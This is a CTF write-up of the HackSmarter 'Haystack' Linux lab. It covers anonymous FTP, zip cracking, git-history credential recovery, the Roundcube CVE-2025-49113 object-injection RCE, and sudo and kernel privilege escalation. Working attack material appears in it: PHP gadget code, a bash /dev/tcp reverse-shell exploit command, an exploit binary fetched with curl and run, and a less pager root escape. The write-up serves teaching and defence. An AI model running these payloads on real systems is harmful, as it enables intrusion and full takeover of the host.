---
title: Haystack
date: 2026-09-09 20:00:00 +0000
categories: [HacksmarterLabs]
tags: [linux, ftp, information-disclosure, zip, password-cracking, git, hardcoded-credentials, credential-reuse, imap, web, roundcube, cve, php, deserialization, rce, sudo, privilege-escalation, kernel-exploit]
media_subpath: /images/hacksmarter_haystack/
image:
  path: 'https://images.coursestack.com/1574ceb8-4d9a-4177-8b4d-7a398e369552/b3901ab1-099b-4a56-8620-ed15b124157b'
---

## Summary

**Haystack** is a medium Linux challenge lab from the OSCP-LK set, hosted on HackSmarter. The starting position is an unauthenticated position on the lab network with a single host in scope, `10.0.27.32`, and the goal is the root flag. Nothing about the chain requires a memory-corruption bug in the intended path: every step is a service doing what it was configured to do, with one published web CVE in the middle.

The way in is anonymous FTP. The share hands out five files, and four of them are unmodified upstream project templates: a Nextra portfolio starter, a Terraform reverse-proxy module, a generic bash backup script and a Joomla base-install SQL dump. The fifth, `app.zip`, is a WinZip AES archive whose password falls to `rockyou.txt` in four seconds. Inside is a Next.js Neo4j example with a `.git` directory still attached, and the git history contains the whole point of the box: the initial commit stored real database credentials in `.env.local`, and the follow-up commit blanked them out. Blanking a value in a tracked file does not remove it from the repository.

Those credentials belong to `justin`, and they authenticate to FTP and to IMAP but not to SSH, because that account is restricted to public-key authentication. Justin's home is also mounted read-only, which is why neither an FTP `STOR` nor a later shell-based append can plant a key in `authorized_keys`. The password is real but there is no service willing to turn it into a shell, so the answer has to come from the web application. A content scan finds a Roundcube 1.6.10 installation at `/roundcube` that nothing on the main site links to, and 1.6.10 is the last version affected by CVE-2025-49113, a post-authentication PHP object injection that turns valid webmail credentials into command execution as `www-data`.

From `www-data` the privilege escalation half is a chain of credentials left lying around in the filesystem:

- The Neo4j application password is also Justin's Linux password, so `su justin` works from the web shell.
- Justin is in `adm`, which makes the rotated vsftpd log readable, and one line in it records a second user's real password in the field vsftpd reserves for the anonymous login string.
- That second user, `gilbert`, holds a single sudo rule, `(root) /usr/bin/git diff *`, which is invisible to `sudo -l` from the nested `su` shell and only shows up from a real SSH login session.
- `git diff` spawns a pager for long output, and `less` will start a shell on demand, so a diff large enough to page becomes a root shell.

There is also an unintended root that skips the sudo rule entirely: the host runs a kernel vulnerable to DirtyFrag (CVE-2026-43284), and a public proof of concept takes any unprivileged local user straight to `uid=0`.

> **Category:** Linux, unauthenticated start. **Starting position:** network access to `10.0.27.32` with no credential. **Goal:** the root flag. **Theme:** anonymous FTP publishes four decoys and one archive whose git history still holds a deleted password, a hidden Roundcube instance converts that password into code execution, and two more passwords recovered from the filesystem lead to a sudo rule that pages its output.
{: .prompt-info }

---

## 1. Recon

One host, and a service list that is unusually mail-heavy for a lab box:

```bash
export IP=10.0.27.32
nmap -vvv -p21,22,80,110,143,993,995 -Pn -sVC -oN nmap $IP
```

```text
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000        73761 May 24 04:40 app.zip
| -rw-r--r--    1 0        0           15562 May 24 05:19 backup.sh
| -rwxrw-r--    1 1000     1000       489837 May 24 05:09 blog.zip
| -rw-r--r--    1 1000     1000        99219 May 24 05:10 joomla.sql
|_-rwxrw-r--    1 1000     1000        12444 May 24 05:09 terraform.zip
22/tcp  open  ssh      OpenSSH 10.2p1 Ubuntu 2ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.66 ((Ubuntu))
|_http-title: In The Haystack
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
993/tcp open  ssl/imap Dovecot imapd
995/tcp open  ssl/pop3 Dovecot pop3d
```

Three facts to carry forward. `ftp-anon` already lists the share contents, so the first foothold candidate is on the table before a single manual command. The four mail ports mean there are real mailboxes with real local users behind them, which makes any password we find worth trying against IMAP as well as SSH. And the TLS certificate on 993 and 995 leaks the hostname:

```text
| ssl-cert: Subject: commonName=lk-linux2
| Subject Alternative Name: DNS:lk-linux2
```

`lk-linux2` is the machine's own name, and it shows up in every shell prompt later. A self-signed certificate generated at install time is a common place to recover an internal hostname when nothing else on the network will tell you one.

### The anonymous share

Anonymous FTP means vsftpd accepts the reserved username `anonymous` (or `ftp`) with any string as the password, by convention an email address, and drops the session into a chroot with no credential attached. Two practical notes before pulling files:

```bash
ftp $IP
```

```text
Name (10.0.27.32:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

The stock BSD `ftp` client starts in **active** mode, where the client opens a listening socket and tells the server to connect back to it with a `PORT` command. Behind a VPN or NAT that never works, and the failure is the pair of errors below. `passive` flips the data channel around so the client is the one connecting out, which is what any modern network expects:

```text
ftp> dir
500 Illegal PORT command.
500 Unknown command.
ftp: bind: Address already in use
```

```text
ftp> passive
Passive mode on.
ftp> prompt off
Interactive mode off.
ftp> mget *
```

`prompt off` matters because `mget *` otherwise asks for a `y` on every file. Five files land locally.

> `ftp-anon` in nmap's output is not just a yes/no answer. It performs the login and prints the root listing, so the scan itself already tells you whether the anonymous share is worth a manual session. Read the script output, not only the port table.
{: .prompt-tip }

---

## 2. One archive, four decoys

Four of the five files are upstream templates with nothing added:

| File | What it actually is |
|---|---|
| `blog.zip` | Nextra "Portfolio Starter Kit" for Next.js, unmodified |
| `terraform.zip` | The `aws_reverse_proxy` Terraform module, unmodified |
| `backup.sh` | `bash-backup` v1.2, every feature disabled, empty credentials |
| `joomla.sql` | A Joomla base-install schema dump with no user rows |

The Joomla dump deserves a moment, because it is the decoy most likely to burn time. Grepping it for passwords produces a hit that looks exactly like a finding:

```bash
grep -i pass joomla.sql
```

```text
(0, 'plg_authentication_ldap', 'plugin', 'ldap', 'authentication', 0, 0, 1, 0, 1, '',
 '{"host":"","port":"389","use_ldapV3":"0","negotiate_tls":"0","no_referrals":"0",
   "auth_method":"bind","base_dn":"","search_string":"","users_dn":"",
   "username":"admin","password":"bobby7", ...}', '', 3, 0),
```

`admin` / `bobby7` is not a credential from this environment. It is the placeholder Joomla ships in its own base install SQL for the LDAP authentication plugin, a nod to the Bobby Tables comic. The row confirms it: the fifth column pair reads `0, 0`, so the plugin is disabled, and `"host":""` means it was never pointed at a directory server. The users table in the same dump has its schema but zero rows, so there is nothing to crack either.

> A grep hit is a lead, not a finding. Before spending time on a recovered credential, check whether the value is a vendor default: search the exact string against the product's own installation data. `bobby7`, `changeme`, `admin:admin` and friends appear in shipped SQL and config templates far more often than they appear in real deployments.
{: .prompt-warning }

### The encrypted archive

`app.zip` is the only file that is not a stock template, and it will not open:

```bash
file app.zip
```

```text
app.zip: Zip archive data, made by v6.3 UNIX, extract using at least v5.1,
last modified May 24 2026 16:31:36, uncompressed size 124, method=AES Encrypted
```

"extract using at least v5.1" and `method=AES Encrypted` mean this is **WinZip AES**, not the legacy ZipCrypto scheme. The difference matters: legacy ZipCrypto is broken by a known-plaintext attack that needs no password guessing at all, while WinZip AES derives its key with PBKDF2-HMAC-SHA1 and has to be attacked by guessing the password. Confirming which one you are looking at decides the whole approach.

Every entry in the archive is encrypted, including the `.git` directory, so there is no partial extraction shortcut:

```bash
7z l -slt app.zip | grep -E '^Path|^Encrypted|^Method'
```

```text
Path = .env.local
Encrypted = +
Method = AES-128 Deflate
Path = .git/config
Encrypted = +
Method = AES-128 Deflate
```

[zip2john](https://github.com/openwall/john) converts the archive header into a crackable hash:

```bash
zip2john app.zip > app.hash
```

```text
app.zip/.env.local:$zip2$*0*1*0*2cc34e1d9c574c03*b940*70*eef03b4a819f8c6aa...*9a1dff5031ce29fdbe81*$/zip2$:.env.local:app.zip:app.zip
ver 5.1 app.zip/.git/config is not encrypted, or stored with non-handled compression type
...
```

The `is not encrypted, or stored with non-handled compression type` lines are misleading. They do not mean those files are readable; the 7-Zip listing above already proved every entry is AES-encrypted. zip2john emits one hash per archive, derived from the first suitable entry, and reports the remaining entries as unhandled because it has no second hash to build from them.

That trailing metadata is also what breaks the first crack attempt. [hashcat](https://github.com/hashcat/hashcat) parses the hash field strictly, and the `:.env.local:app.zip:app.zip` suffix that John's format appends is not part of it:

```bash
hashcat '$zip2$*0*1*0*2cc34e1d9c574c03*...*$/zip2$:.env.local:app.zip:app.zip' /opt/rockyou.txt
```

```text
No hash-mode matches the structure of the input hash.
```

Cut the line down to the `$zip2$...$/zip2$` token and autodetect resolves it immediately. Mode `13600` is WinZip, and the `*1*` in the second field is the AES key-size selector that matches the `AES-128` the listing reported:

```bash
hashcat -m 13600 '$zip2$*0*1*0*2cc34e1d9c574c03*b940*70*eef03b4a819f8c6aa...*9a1dff5031ce29fdbe81*$/zip2$' /opt/rockyou.txt
```

```text
The following mode was auto-detected as the only one matching your input hash:
13600 | WinZip | Archive

$zip2$*0*1*0*2cc34e1d9c574c03*b940*70*eef03b4a...*$/zip2$:taekwondo

Status...........: Cracked
Progress.........: 16384/14344384 (0.11%)
Time.Started.....: Wed Sep  9 21:46:25 2026 (0 secs)
```

Cracked at 0.11 percent of the wordlist, in four seconds. `taekwondo` sits near the top of `rockyou.txt`.

```bash
7z x app.zip -oapp
```

```text
Enter password:taekwondo

Everything is Ok
Folders: 53
Files: 75
```

---

## 3. The needle is in the git history

The extracted tree is Vercel's `with-neo4j` Next.js example, and it shipped with its repository metadata intact:

```bash
ls -a app
```

```text
.env.local  .git  README.md  components  lib  movie-sample.md
package.json  pages  public  styles  util
```

`.env.local` holds the database configuration the application reads at startup, and on disk it is empty:

```bash
cat app/.env.local
```

```text
# Environment variables required to connect the app with your Neo4j database
NEO4J_URI=10.0.0.1
NEO4J_USER=
NEO4J_PASSWORD=
```

A blank secret in a file that is clearly meant to hold one is an invitation to look at how it got blanked. Git stores every version of every tracked file as an immutable object, so removing a value from the working copy does nothing to the object that already recorded it:

```bash
cd app
PAGER= git log
```

```text
commit f89b4ad40ff87ae42da5bd1c5934ddd23ae54b75 (HEAD -> main)
Author: ellen.freeman <ellen.freeman>
Date:   Sun May 24 16:32:12 2026 +0000

    TODO: add a .gitignore

commit ee7e8b58c112747a079730c7f96136a24eba8e9c
Author: ellen.freeman <ellen.freeman>
Date:   Sun May 24 16:31:09 2026 +0000

    initial commit
```

Two commits, and the second one is named after the mistake. "TODO: add a .gitignore" is written by someone who has just realised `.env.local` should never have been tracked, and whose fix was to empty the file rather than to rewrite history:

```bash
PAGER= git show f89b4ad40ff87ae42da5bd1c5934ddd23ae54b75
```

```text
diff --git a/.env.local b/.env.local
index ce5b4cd..4cce7e0 100644
--- a/.env.local
+++ b/.env.local
@@ -1,4 +1,4 @@
 # Environment variables required to connect the app with your Neo4j database
 NEO4J_URI=10.0.0.1
-NEO4J_USER=justin
-NEO4J_PASSWORD=ArepasConQueso2026!
+NEO4J_USER=
+NEO4J_PASSWORD=
```

The `-` lines are the content of blob `ce5b4cd`, which is still in `.git/objects` and always will be until someone runs a history rewrite and prunes. `git show ee7e8b5:.env.local` reads it just as well.

> Deleting a secret in a new commit is not a remediation. Every clone of the repository, and every archive of the working directory that includes `.git`, carries the original blob. Real remediation is two separate actions: rotate the credential at the service that accepts it, then rewrite history with `git filter-repo` or the BFG and force-push. Only the first of those actually protects anything.
{: .prompt-danger }

Two things came out of that diff beyond the password. `ellen.freeman` is an author name, which is a username candidate for a domain that names accounts `first.last`. And `NEO4J_URI=10.0.0.1` is an internal address that no scan of this lab will reach, which is a reminder that a leaked config describes the environment it was written in, not necessarily the one in front of you.

That leaves one credential pair, `justin` with the password from the deleted blob, and four services to try it against.

---

## 4. What the password opens, and what it does not

A single credential against four listening services is worth testing exhaustively before assuming it is the way in.

**SSH refuses it:**

```bash
ssh justin@$IP
```

```text
justin@10.0.27.32: Permission denied (publickey).
```

The parenthesised list is the set of authentication methods the server was still willing to try when the attempt ran out. `(publickey)` alone means the password was never offered at all, so this is not a wrong password: it is a server that declined to ask for one. A password that fails against a password-authenticating server and a password that is never sent look identical in a script and mean completely different things.

Read that as a statement about **this account**, not about the service. `sshd_config` scopes `PasswordAuthentication` per user and per group through `Match` blocks, so "publickey only" for `justin` says nothing about the next account you recover. It turns out to matter twice on this box: a later user does accept a password over SSH, and that difference is what exposes the privilege escalation in section 9.

**FTP accepts it, and the session is a different chroot:**

```bash
ftp $IP
```

```text
Name (10.0.27.32:user): justin
230 Login successful.
ftp> passive
ftp> ls -la
drwxr-xr--    6 1000     1000         4096 May 24 14:26 .
drwxr-xr-x    4 0        0            4096 May 24 21:53 ..
lrwxrwxrwx    1 0        0               9 May 24 06:47 .bash_history -> /dev/null
-rw-r--r--    1 1000     1000         3771 Feb 13  2026 .bashrc
drwx------    2 1000     1000         4096 May 24 03:54 .cache
drwxrwxr-x    3 1000     1000         4096 May 24 03:59 .local
-rw-------    1 1000     1000           13 May 24 05:56 .mariadb_history
drwx------    2 1000     1000         4096 May 24 03:51 .ssh
drwx------    3 1000     1000         4096 May 24 06:08 mail
-rw-r--r--    1 0        0              12 May 24 14:26 user.txt
```

An authenticated vsftpd session lands in the user's home rather than the anonymous share, so this is a full read primitive over `/home/justin`. Note that `dir` and `ls` without `-a` hide every dotfile; the interesting half of a home directory is entirely dotfiles, so `ls -la` is not optional here.

`user.txt` downloads without trouble, and turns out to hold a template placeholder rather than a real value. This lab scores a single flag, the root one, so that is expected and not a sign of a mis-solved step.

**The `.ssh` directory looks like a free foothold and is not:**

```text
ftp> cd .ssh
ftp> ls -la
drwx------    2 1000     1000         4096 May 24 03:51 .
-rw-------    1 1000     1000            0 May 24 03:51 authorized_keys
```

`authorized_keys` exists, is zero bytes, and is owned by UID 1000 with mode `0600` inside a `0700` directory owned by the same UID. Every permission bit says the FTP session should be able to overwrite it. It cannot:

```text
ftp> put id_ed25519.pub authorized_keys
550 Permission denied.
```

A `550` on `STOR` has two common causes and they are worth separating, because the fix is different for each. The first is vsftpd policy: `write_enable=NO` in `vsftpd.conf` rejects every upload regardless of filesystem permissions. The second is the filesystem itself. Later in this chain, with an actual shell as `justin`, the same write fails again and the kernel gives the real answer:

```bash
echo 'ssh-ed25519 AAAA...' >> ~/.ssh/authorized_keys
```

```text
bash: /home/justin/.ssh/authorized_keys: Read-only file system
```

The home directory is on a read-only mount. No amount of correct ownership will produce a write, and no FTP configuration change would have helped either. This is worth internalising: `ls -l` describes what the ACL would allow, not what the mount will permit, and the two are checked at different layers.

**IMAP accepts it, and the mailbox is empty.** Port 993 is IMAP over implicit TLS, so a plain `nc` will not speak it. `openssl s_client` does the TLS handshake and then hands the raw session over, and `-crlf` is required because IMAP commands must be terminated with `\r\n` while a terminal sends bare `\n`:

```bash
openssl s_client -crlf -connect $IP:993
```

Each IMAP command is prefixed with a client-chosen tag that the server echoes back in its response, which is how a client matches replies to requests on a pipelined connection. Any short string works:

```text
* OK [CAPABILITY IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE SASL-IR LITERAL+ AUTH=PLAIN] Dovecot ready.
11 login justin 'ArepasConQueso2026!'
11 NO [AUTHENTICATIONFAILED] Authentication failed.

11 login justin ArepasConQueso2026!
11 OK [CAPABILITY IMAP4rev1 SASL-IR ...] Logged in
12 select "INBOX"
* 0 EXISTS
* 0 RECENT
12 OK [READ-WRITE] Select completed (0.004 + 0.000 + 0.003 secs).
13 search all
* SEARCH
13 OK Search completed (0.001 + 0.000 secs).
```

The first attempt failing is instructive. IMAP has its own quoting rules and single quotes are not one of them: `'ArepasConQueso2026!'` was sent as a literal password including the quote characters. Shell habits do not transfer to a protocol you are typing by hand.

`* 0 EXISTS` and an empty `SEARCH ALL` mean the mailbox genuinely has no messages, not that the query was wrong. `EXISTS` is the server's own count of messages in the selected mailbox.

At this point the credential is proven real against two services and useless for execution on both. The password is not the exploit; it is the input to one.

---

## 5. The application nobody linked to

Back to port 80. The site at the root is a static template with the title "In The Haystack" and no dynamic content at all, so the interesting surface has to be something not linked from it. [dirsearch](https://github.com/maurosoria/dirsearch) walks a wordlist against the server and reports what answers:

```bash
dirsearch -u http://$IP/
```

```text
[22:15:42] 200 -    7KB - /contact.html
[22:15:43] 301 -   346B - /css  ->  http://10.0.27.32/css/
[22:15:48] 301 -   348B - /fonts  ->  http://10.0.27.32/fonts/
[22:15:51] 301 -   349B - /images  ->  http://10.0.27.32/images/
[22:15:51] 200 -   13KB - /index.html
[22:15:53] 301 -   345B - /js  ->  http://10.0.27.32/js/
[22:15:59] 400 -   341B - /Office/graph.php#xxe
[22:16:06] 200 -    5KB - /roundcube/index.php
```

Two of those lines are noise and one is the box. `/Office/graph.php#xxe` returned `400 Bad Request`: that entry exists in the wordlist as an exploitation payload, the `#xxe` fragment makes the request line malformed, and Apache rejected it before routing. A `400` is the server saying it could not parse the request, which carries no information about whether the path exists. Scanners report status codes; deciding which codes are evidence is still your job.

`/roundcube/index.php` returning `200` with 5KB of content is the real result. Roundcube is a PHP webmail client, and the four Dovecot ports from the initial scan are exactly the backend it would be sitting in front of.

![Roundcube login page served from /roundcube on the target](roundcube-login.png)
_The Roundcube webmail login, on a path nothing in the static site links to_

The credentials recovered from git are IMAP credentials, and Roundcube authenticates by proxying the login straight to the IMAP server, so they work here by construction:

![Roundcube login form filled in with the justin username](roundcube-login-justin.png)
_The same credentials that authenticated against Dovecot on 993, submitted through the web client_

![Roundcube inbox showing the list is empty](roundcube-inbox-empty.png)
_The empty inbox, matching the `* 0 EXISTS` returned by the raw IMAP session_

The mailbox is as empty here as it was over IMAP, which rules out the obvious reason to want webmail access. The value is the application itself, and Roundcube states its version in Settings, under About:

![Roundcube About dialog reporting version 1.6.10](roundcube-version-1610.png)
_Settings, About: Roundcube Webmail 1.6.10_

> When a version-specific CVE is the goal, prefer the application's own About or status page over banner guessing. Roundcube also exposes the version programmatically as `"rcversion":10610` in the JavaScript configuration embedded in every page, which is what automated checks parse. `10610` is the encoded form of 1.6.10.
{: .prompt-tip }

---

## 6. CVE-2025-49113: Roundcube post-auth object injection

1.6.10 is the last release affected by CVE-2025-49113. It is a **post-authentication** PHP object injection in the settings file-upload handler, which is precisely why the credentials mattered: the vulnerability is unreachable without a valid session, so the git-history leak and the CVE are two halves of one step.

The mechanism is worth walking through, because it is not a call to `unserialize()` on attacker input.

**Step one, an unsanitised parameter reaches the session.** `program/actions/settings/upload.php` takes the `_from` GET parameter and uses it, without filtering, to build the key under which the uploaded file's metadata is stored in `$_SESSION`. The uploaded **filename** goes into the value.

**Step two, PHP's session serializer is the injection point.** PHP's default `session.serialize_handler` is `php`, whose on-disk format is a flat sequence of `name|serialized_value` records, with `|` as the delimiter between a variable name and its value. That format has no escaping. A `|` character inside a stored *value* is indistinguishable from the delimiter that starts the next variable, so when the session file is read back on the following request, PHP parses everything after that `|` as a fresh variable name and calls `unserialize()` on what follows.

Injecting a `|` followed by a serialized object into a value that lands in the session therefore produces object instantiation on the next request, with no `unserialize()` call anywhere in the application's own code. The public exploit builds exactly that string and submits it as the filename of a small valid PNG:

```php
public function __construct($_gpgconf)
{
    $_gpgconf = base64_encode($_gpgconf);
    $this->_gpgconf = "echo \"{$_gpgconf}\"|base64 -d|sh;#";
}

public function gadget()
{
    return '|'. serialize($this) . ';';
}
```

**Step three, the gadget.** Instantiating an object is only useful if some class reachable in the application does something dangerous when PHP destroys it. Roundcube bundles the PEAR `Crypt_GPG` library, and `Crypt_GPG_Engine` cleans up after itself in its destructor by shelling out to the `gpgconf` binary to kill idle agents, using its `$_gpgconf` property as the command:

- `$_gpgconf` is set to `echo "<base64 payload>"|base64 -d|sh;#`.
- `$_homedir` is left empty.
- `$_process` is set to `false`, so the subprocess-cleanup branch that runs first returns immediately instead of erroring on a missing resource.

When the destructor builds its command line it produces `echo "..."|base64 -d|sh;# --homedir '' --kill all`. The `;` ends the injected command and the `#` comments out the real arguments the library appends. The base64 wrapper exists so the payload survives being embedded in a filename, a serialized string and a shell command line without any quoting collision.

> This is the general shape of every PHP object-injection bug, and the delivery vector is interchangeable: a `phar://` stream wrapper, a cookie, a cache entry, or as here a session-file delimiter. What stays constant is that the payload is a property bag, and the code that runs is a **magic method** the application never calls directly. The same destructor-driven pattern is covered in more depth on the [PHAR deserialization](/theory/misc/phar-deserialization) page.
{: .prompt-info }

Running the [hakaioffsec proof of concept](https://github.com/hakaioffsec/CVE-2025-49113-exploit), with a listener already waiting:

```bash
nc -lvnp 9999
```

```bash
php roundcube_exp.php http://$IP/roundcube justin 'ArepasConQueso2026!' 'bash -c "bash -i >& /dev/tcp/10.200.92.216/9999 0>&1"'
```

```text
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

```text
Listening on 0.0.0.0 9999
Connection received on 10.0.27.32 44350
bash: cannot set terminal process group (1174): Inappropriate ioctl for device
bash: no job control in this shell
```

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The "cannot set terminal process group" warning is the shell reporting that it has no controlling terminal. It is harmless for command execution but it breaks anything that needs one, which becomes relevant twice in the next two sections.

---

## 7. www-data to justin, on the password we already had

The web shell runs as `www-data`, which owns nothing. The credential from the git history has already been proven to work against IMAP, and the account it belongs to is a real local user with UID 1000. `su` is the one authentication path on this box that has not refused the password yet, because unlike SSH it has no `PasswordAuthentication` setting to turn off:

```bash
su justin
```

```text
Password:
```

```bash
id
```

```text
uid=1000(justin) gid=1000(justin) groups=1000(justin),4(adm),100(users)
```

That `su` succeeding is the whole lesson of the section. The Neo4j service account password and the Linux account password for `justin` are the same string. An application configuration file was never intended to be an authentication database, but every time an administrator reuses their own password for a service credential, it becomes one.

> `su` needs a controlling terminal to read a password. From a raw `nc` reverse shell it will usually fail with "must be run from a terminal". Upgrading first with `python3 -c 'import pty;pty.spawn("/bin/bash")'`, then `Ctrl-Z`, `stty raw -echo; fg`, is what makes this step work.
{: .prompt-tip }

The group list is the payload of this step, not the shell. `justin` is a member of **`adm`**, which is the Debian and Ubuntu group whose entire purpose is reading system logs. Logrotate's shipped rules create rotated log files as `root:adm` with mode `0640` precisely so that a member of `adm` can read them without being root.

---

## 8. justin to gilbert, out of the FTP log

The service that has been the centre of this box since the first scan also writes a log, and `adm` membership makes it readable:

```bash
cat /var/log/vsftpd.log.1
```

```text
Sun May 24 04:41:36 2026 [pid 2996] CONNECT: Client "::ffff:192.168.186.128"
Sun May 24 04:41:39 2026 [pid 2995] [ftp] OK LOGIN: Client "::ffff:192.168.186.128", anon password "ftp"
Sun May 24 06:47:58 2026 [pid 3832] CONNECT: Client "::ffff:192.168.186.128"
Sun May 25 04:41:39 2026 [pid 2995] [ftp] OK LOGIN: Client "::ffff:192.168.186.128", gilbert password "1xXOneMoreCachapaXx1"
Mon May 25 01:26:35 2026 [pid 3967] CONNECT: Client "::ffff:192.168.186.128"
Mon May 25 01:26:38 2026 [pid 3966] [ftp] OK LOGIN: Client "::ffff:192.168.186.128", anon password "ftp"
```

Every other successful line reads `anon password "ftp"`. One does not.

vsftpd deliberately records the password string for **anonymous** sessions, because in the anonymous convention that field is not a secret at all: it is supposed to be a courtesy email address identifying who is downloading. The daemon writes it verbatim on the assumption that it is public information. It has no way to know that the person at the keyboard typed a real account name and a real account password into the anonymous prompt instead.

That is what happened here, and it is a category of finding you should look for on any box with FTP: authentication logs are written by services that were told which fields are secret, and any field the service believes is public gets logged in clear. The same class of mistake produces passwords in `.bash_history`, in web-server access logs when a form posts over `GET`, and in process listings when a password is passed as a command-line argument.

```bash
su gilbert
```

```text
Password:
```

```bash
id
```

```text
uid=1001(gilbert) gid=1001(gilbert) groups=1001(gilbert),100(users)
```

---

## 9. gilbert to root through the pager

Enumerating sudo from the `su gilbert` shell, the one nested inside the reverse shell, reports that there is nothing to enumerate:

```bash
sudo -l
```

```text
sudo: Sorry, user gilbert may not run sudo on lk-linux2.
```

That message reads like a definitive answer, and it is wrong. Recall from section 4 that `justin` was refused SSH with `Permission denied (publickey)`. `gilbert` is not, because the password restriction is scoped per account, and the password from the FTP log logs straight in:

```bash
ssh gilbert@$IP
```

From that session, the identical command returns something else entirely:

```bash
sudo -l
```

```text
[sudo: authenticate] Password:
User gilbert may run the following commands on lk-linux2:
    (root) /usr/bin/git diff *
```

Same user, same host, same binary, opposite answers. The only thing that changed is how the session was created: one shell descends from an Apache worker through `su`, the other is a real login session that sshd built through PAM, with its own tty, its own PAM session stack and its own environment. sudo's behaviour depends on that context, and a nested `su` shell is not equivalent to a login.

The practical rule is the one worth carrying off this box: **the moment you recover a password, spend the one command it costs to try a real login with it.** Re-running enumeration from a proper session, rather than trusting what a shell inherited three processes deep reported, is what turns a dead end into the privilege escalation here.

> This cuts both ways during enumeration. A negative result from a degraded shell is not evidence of absence, and it is worth keeping a short list of the checks that are known to misbehave without a login session or a tty: `sudo -l`, `su`, anything reading `/proc/self/loginuid`, `systemctl --user`, and any tool that expects `$HOME`, `$USER` or `$TERM` to be set correctly. Re-run them after every upgrade in session quality, not just once.
{: .prompt-warning }

### Why this rule is a root shell

The rule allows `git diff` with any arguments, as root. `git diff` does not read files as root in a way that helps much on its own, but git's output handling does.

Git sends long output through a **pager**. The pager is chosen from `GIT_PAGER`, then `core.pager`, then `PAGER`, then the compiled-in default, which is `less`. Git only invokes it when the output does not fit on one screen and the destination is a terminal. And `less` is an interactive program with a documented escape: `!command` runs `command` in a shell.

Everything git spawns inherits git's privileges. Under `sudo git diff`, git is root, so the pager is root, so the shell the pager starts is root.

Two details make it work reliably. The sudoers rule pins `diff` as the first word after `git`, so the other GTFOBins routes that need a global option (`git -c core.pager='!/bin/sh' ...` or `git -p help config`) are not available: anything before `diff` breaks the match. And the output has to be long enough to trigger paging, which is why diffing `/dev/null` against a file with forty lines is the reliable choice:

```bash
sudo git diff /dev/null /etc/passwd
```

```text
diff --git a/etc/passwd b/etc/passwd
new file mode 100644
index 0000000..7ef9c8b
--- /dev/null
+++ b/etc/passwd
@@ -0,0 +1,40 @@
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

With `less` holding the output, typing `!/bin/bash` at its prompt is the escape:

```text
!/bin/bash
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

```text
<redacted>
```

> Restricting a sudo rule to one subcommand is not a restriction if that subcommand can spawn another program. Git, `man`, `less`, `more`, `vi`, `find`, `awk`, `tar` and dozens of others all have a documented way to execute a command, and sudo hands them a root token to do it with. If a rule like this is genuinely required, the mitigation is to force a non-interactive pager in the environment sudo builds, for example `Defaults env_keep -= "PAGER"` combined with a wrapper that sets `GIT_PAGER=cat`, and to accept that the rule is still only as safe as the next git feature nobody audited.
{: .prompt-danger }

---

## 10. Unintended root: DirtyFrag

The sudo rule is the intended path, but it is not the only one, and the alternate route does not need `gilbert` at all: any unprivileged local user on this host reaches root, `www-data` included.

The box runs a kernel affected by **DirtyFrag**, the pair of local privilege escalations disclosed in May 2026: CVE-2026-43284 in the xfrm/ESP (IPsec) path and CVE-2026-43500 in rxrpc. Both give the same primitive: an in-place cryptography fragmentation bug that corrupts the page cache, which lets an unprivileged process rewrite the contents of read-only file pages. That is the DirtyCow and DirtyPipe outcome reached by a new route, and the usual finish is to overwrite a setuid binary or blank the password field for `root` in `/etc/passwd`. The public proof of concept needs no special capability and no race window.

Serve the binary from the attacking host and pull it into a writable directory:

```bash
python3 -m http.server 8000
```

```bash
cd /tmp
curl 10.200.92.216:8000/dirtyfrag -O
chmod +x dirtyfrag
./dirtyfrag
```

```text
id
uid=0(root) gid=0(root) groups=0(root)
```

Note that `/tmp` is writable even though `/home/justin` is not: the read-only mount that blocked the `authorized_keys` write in section 4 covers home directories, not the whole filesystem. Checking `mount` output before concluding that a box is immutable is worth the one command.

> A kernel LPE is a last-resort answer, not a first one, and on a lab it usually means you have skipped something. Enumerate credentials, sudo rules, SUID binaries, cron and writable service files first: those are the paths the box was built around, and they are the paths that teach you something. Reach for the kernel when triage is genuinely exhausted. Note also that running a kernel exploit is the single most likely action in a real engagement to take the host down, which is why it needs written authorisation before you type it.
{: .prompt-warning }

---

## Understanding the Attack Chain

Every step in the intended path is either a service doing exactly what it was configured to do or a published bug in a version that was never updated. The table separates what each piece is worth on its own from what it is worth in sequence.

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| Anonymous FTP read | `vsftpd.conf` | Low: file listing | Delivers every artifact in the chain |
| Four upstream templates | The FTP share | None | Time sink hiding the one real file |
| Joomla default `bobby7` | `joomla.sql` | None: vendor sample | A grep hit that leads nowhere |
| WinZip AES on `app.zip` | The archive header | Medium if strong | Falls to `rockyou.txt` in 4 seconds |
| `.git` inside the archive | Packaging mistake | Low: source disclosure | Carries the deleted blob |
| Secret removed by commit | `.env.local` history | Critical if reachable | `justin` password, still in `git show` |
| Password reuse | App config equals Linux account | High | Turns a config value into a login |
| SSH publickey only for justin | `sshd_config` `Match` | Hardening | Forces the chain through the web app |
| SSH password auth for gilbert | Same config, other scope | Low on its own | Login session that reveals the sudo rule |
| Read-only home mount | Mount options | Hardening | Kills the `authorized_keys` shortcut |
| Unlinked Roundcube 1.6.10 | `/roundcube` | Medium: login page | The one authenticated attack surface |
| CVE-2025-49113 | Session serializer plus PEAR gadget | Critical post-auth | Credentials become RCE as `www-data` |
| `su` accepts the password | PAM, no policy switch | By design | `www-data` becomes `justin` |
| `adm` group membership | `justin` supplementary group | Low: log read | Opens the rotated vsftpd log |
| Password in the FTP log | `anon password "..."` field | Critical if readable | `gilbert` credentials in clear text |
| `sudo git diff *` | sudoers rule | Looks narrow | Root through the `less` escape |
| DirtyFrag kernel LPE | CVE-2026-43284 | Critical for any local user | Root without touching the sudo rule |
